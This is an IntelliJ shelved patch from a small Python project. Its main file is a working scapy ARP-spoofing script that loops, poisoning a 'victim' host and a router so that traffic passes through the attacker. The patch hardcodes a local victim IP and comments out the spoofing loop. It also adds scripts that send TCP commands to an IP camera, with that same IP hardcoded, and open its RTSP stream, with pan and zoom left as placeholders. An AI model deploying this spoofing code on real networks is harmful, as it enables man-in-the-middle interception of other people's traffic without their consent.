@@ -1,0 +1,120 @@
+Index: arp_spoof.py
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+<+>import scapy.all as scapy\r\nimport sys\r\nimport time\r\n\r\n\r\n\r\ndef arp_spoof(target_ip: str, spoof_ip: str, attempts = 5):\r\n    target_mac = get_mac(target_ip)\r\n    while target_mac is None and attempts > 0:\r\n        print(f\"Retrying... Attempts left: {attempts}\")\r\n        time.sleep(2)  # Wait for 2 seconds before retrying\r\n        target_mac = get_mac(target_ip)\r\n        attempts -= 1\r\n\r\n    if target_mac is None:\r\n        print(f\"Could not find MAC address for {target_ip} after several attempts. Exiting...\")\r\n        sys.exit(1)\r\n\r\n    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)\r\n    scapy.send(packet, verbose=False)\r\n\r\n\r\ndef get_mac(ip: str):\r\n    arp_request = scapy.ARP(pdst=ip)\r\n    broadcast = scapy.Ether(dst=\"ff:ff:ff:ff:ff:ff\")\r\n    arp_request_broadcast = broadcast / arp_request\r\n    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]\r\n\r\n    if answered_list:\r\n        print(f'MAC of {ip}: {answered_list[0][1].hwsrc}')\r\n        return answered_list[0][1].hwsrc\r\n    else:\r\n        print(f\"No response received for IP: {ip}\")\r\n        return None\r\n\r\n    return answered_list[0][1].hwsrc\r\n\r\n\r\nvictim_ip = input('Victim IP: ')  # taking the victim ip_address\r\nrouter_ip = input('Router IP: ')  # taking the router ip address\r\nsent_packets_count = 0  # initializing the packet counter\r\nwhile True:\r\n    sent_packets_count += 2\r\n    arp_spoof(victim_ip, router_ip)\r\n    arp_spoof(router_ip, victim_ip)\r\n    print(\"[+] Packets sent \" + str(sent_packets_count), end=\"\\r\")\r\n    sys.stdout.flush()\r\n    time.sleep(2)\r\n\r\n\r\n
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/arp_spoof.py b/arp_spoof.py
+--- a/arp_spoof.py	(revision c298bba71bceddf9198ee7d6ae3241b0d7c81da0)
++++ b/arp_spoof.py	(date 1717498331716)
+@@ -27,7 +27,7 @@
+     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+ 
+     if answered_list:
+-        print(f'MAC of {ip}: {answered_list[0][1].hwsrc}')
++        # print(f'MAC of {ip}: {answered_list[0][1].hwsrc}')
+         return answered_list[0][1].hwsrc
+     else:
+         print(f"No response received for IP: {ip}")
+@@ -36,15 +36,10 @@
+     return answered_list[0][1].hwsrc
+ 
+ 
+-victim_ip = input('Victim IP: ')  # taking the victim ip_address
+-router_ip = input('Router IP: ')  # taking the router ip address
+-sent_packets_count = 0  # initializing the packet counter
+-while True:
+-    sent_packets_count += 2
+-    arp_spoof(victim_ip, router_ip)
+-    arp_spoof(router_ip, victim_ip)
+-    print("[+] Packets sent " + str(sent_packets_count), end="\r")
+-    sys.stdout.flush()
+-    time.sleep(2)
++victim_ip = "192.168.88.123"  # taking the victim ip_address
++router_ip = "192.168.88.1"  # taking the router ip address
++
++
++
+ 
+ 
+Index: TCP_commands.py
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/TCP_commands.py b/TCP_commands.py
+new file mode 100644
+--- /dev/null	(date 1717500584148)
++++ b/TCP_commands.py	(date 1717500584148)
+@@ -0,0 +1,14 @@
++import socket
++
++def send_tcp_command(ip, port, command):
++    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
++        s.connect((ip, port))
++        s.sendall(command.encode())
++        response = s.recv(1024)
++        print("Received:", response.decode())
++
++# Example usage
++camera_ip = '192.168.88.123'
++camera_port = 554  # Change to the appropriate port
++command = 'GET /status'
++send_tcp_command(camera_ip, camera_port, command)
+Index: RTSP_commands.py
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/RTSP_commands.py b/RTSP_commands.py
+new file mode 100644
+--- /dev/null	(date 1717500800059)
++++ b/RTSP_commands.py	(date 1717500800059)
+@@ -0,0 +1,28 @@
++import cv2
++
++def control_rtsp_stream(rtsp_url, control_command):
++    cap = cv2.VideoCapture(rtsp_url)
++    if not cap.isOpened():
++        print("Failed to open the RTSP stream")
++        return
++
++    # Example control logic: this is hypothetical as actual control would depend on the camera's API
++    if control_command == 'zoom':
++        # Send a zoom command: This is a placeholder
++        print("Zoom command sent")
++    elif control_command == 'pan':
++        # Send a pan command: This is a placeholder
++        print("Pan command sent")
++
++    # Just to demonstrate, let's read one frame
++    ret, frame = cap.read()
++    if ret:
++        cv2.imshow('RTSP Stream', frame)
++        cv2.waitKey(5000)  # Display the frame for 5 seconds
++
++    cap.release()
++    cv2.destroyAllWindows()
++
++# Example RTSP URL and control
++rtsp_url = 'rtsp://192.168.88.123/channel1'
++control_rtsp_stream(rtsp_url, 'zoom')
+Index: .idea/.gitignore
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/.gitignore b/.idea/.gitignore
+new file mode 100644
+--- /dev/null	(date 1717144172006)
++++ b/.idea/.gitignore	(date 1717144172006)
+@@ -0,0 +1,8 @@
++# Default ignored files
++/shelf/
++/workspace.xml
++# Editor-based HTTP Client requests
++/httpRequests/
++# Datasource local storage ignored files
++/dataSources/
++/dataSources.local.xml
